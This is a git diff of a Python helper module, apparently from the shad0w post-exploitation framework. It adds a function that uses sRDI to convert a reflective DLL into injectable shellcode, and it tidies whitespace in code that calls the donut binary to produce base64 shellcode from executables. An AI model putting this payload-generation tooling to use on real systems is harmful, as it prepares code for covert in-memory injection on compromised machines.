@@ -3,6 +3,18 @@ import donut
 import base64
 import tempfile
 
+from lib.ShellcodeRDI import *
+
+def generate_srdi(file, flags):
+    """ generate shellcode from a reflective dll using sRDI """
+
+    hfunc = HashFunctionName("Entry")
+
+    with open(file, "rb") as file:
+        dll_data = file.read()
+
+    return ConvertToShellcode(dll_data, hfunc, b"None", flags)
+
 def parse_donut_error(data, filename):
     if "Error : File not found." in data:
         print(f"Unable to find '{filename}'")
@@ -37,7 +49,7 @@ def generate(file, args, params, parse=True):
     """
 
     # using the python bindings for donut doesn't seem to let them
-    # build shellcode from a pe with any arguments? Using this as 
+    # build shellcode from a pe with any arguments? Using this as
     # a dirty work around untill this is fixed
 
     # if we need to parse the args an build it from them then
@@ -74,14 +86,14 @@ def generate(file, args, params, parse=True):
         with open(temp.name, "rb") as file:
             data = file.read()
             return base64.b64encode(data).decode()
-    
+
     elif parse == False:
         # location of our donut binary
         donut = f"/root/shad0w/bin/donut.elf"
 
         # create a temp file
         temp = tempfile.NamedTemporaryFile()
-        
+
         # build the command to generate our shellcode
         if params:
             cmd = f"{donut} {file} -p \'{params}\' -o {temp.name}"
